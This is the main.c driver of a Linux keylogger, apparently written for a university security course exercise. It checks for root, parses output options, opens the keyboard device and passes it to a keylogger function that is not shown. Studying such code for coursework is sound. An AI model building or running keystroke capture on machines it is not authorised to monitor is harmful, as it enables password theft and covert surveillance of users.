/* * * * * * * * * * * * * * * * *\
 *                               *
 *        Linux keylogger        *
 *                               *
 * File:    	main.c      *
 * Author:  	Tasos Anastasas  *
 * A.M:     	3166             *
 * Course:  	CS457            *
 * Exercises: 	2017             *
 * Number:   	3                *
\* * * * * * * * * * * * * * * * */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

#include "keylogger.h"

int main(int argc, char *argv[]) {
    int opt;
    int root;
    int kb;
    int to_output;
    char *output;


    /* init */
    output = NULL;
    to_output = 0;

    /* check root */
    root = isRoot();
    if (!root) usage();

    if (argc == 1) usage();
    
    /* get options */
    while ((opt = getopt(argc, argv, "f:sh")) != -1) {
        switch (opt) {
            case 'f':
                output = strdup(optarg);
                to_output = open(output, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
                if (to_output < 0) {
                    printf("\nUnable to open the file <%s>\n", output);
                    exit(EXIT_FAILURE);
                }
                break;
            case 's':
                to_output = 1;
                break;
            case 'h':
            default:
                usage();
        }
    }


    /* Keyboard file descriptor */
    if ((kb = open(KEYBOARD, O_RDONLY)) < 0) {
        printf("\nUnable to read from the device\n");
        exit(EXIT_FAILURE);
    }

    keylogger(kb, to_output);

    printf("\nKeylogger terminated.\n");

    /* Close the keyboard file descriptor */
    close(kb);

    if (output != NULL) {
        close(to_output);
    }
    return 0;
}